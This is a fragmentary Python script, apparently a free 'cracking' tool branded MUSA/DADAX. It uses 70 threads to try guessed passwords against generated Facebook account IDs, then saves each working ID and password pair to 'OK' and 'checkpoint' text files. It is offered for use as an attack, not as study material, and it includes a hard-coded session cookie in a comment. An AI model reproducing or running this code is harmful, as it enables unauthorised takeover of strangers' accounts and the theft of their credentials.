...
→   Facebook   :  MUSA
→   Github     :  NO
→   Tool Type  :  \x1b[1;95mFREE TOOL
\x1b[1;97m→   Version    :  1.1.0
\33[1;37m----------------------------------------------""")
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='3':
		os.system('xdg-open https://github.com/PATHAN.314/dump')
	if riaz1 =='4':
		os.system('https://www.facebook.com/doran.khh?mibextid=ZbWKwL');dada()
	if riaz1 =='2':
		bangla()
	else:
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        print('\x1b[1;91m FRIENDS😍  DADAX MUSA MALGHA LARA')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru]
    ...
    print('Press Enter to Back');dada()
#
def m2():
    user=[]
    os.system('clear')
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=0q-9Y51kfN5qipTdowV6iO9A; sb=0q-9YwNWFM6w1xv35UqYyTtR; m_pixel_ratio=2; wd=360x664; fr=0RDugbEHDSkMMgXnW..Bjva_S.j2.AAA.0.0.Bjva_a.AWU2amTZ0Bs',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MUSA-OK] '+cid+'|'+ps+'\033[0;97m')
                open('DADAX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[MUSA-CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('DADAX-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mNOOB.MUSA\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
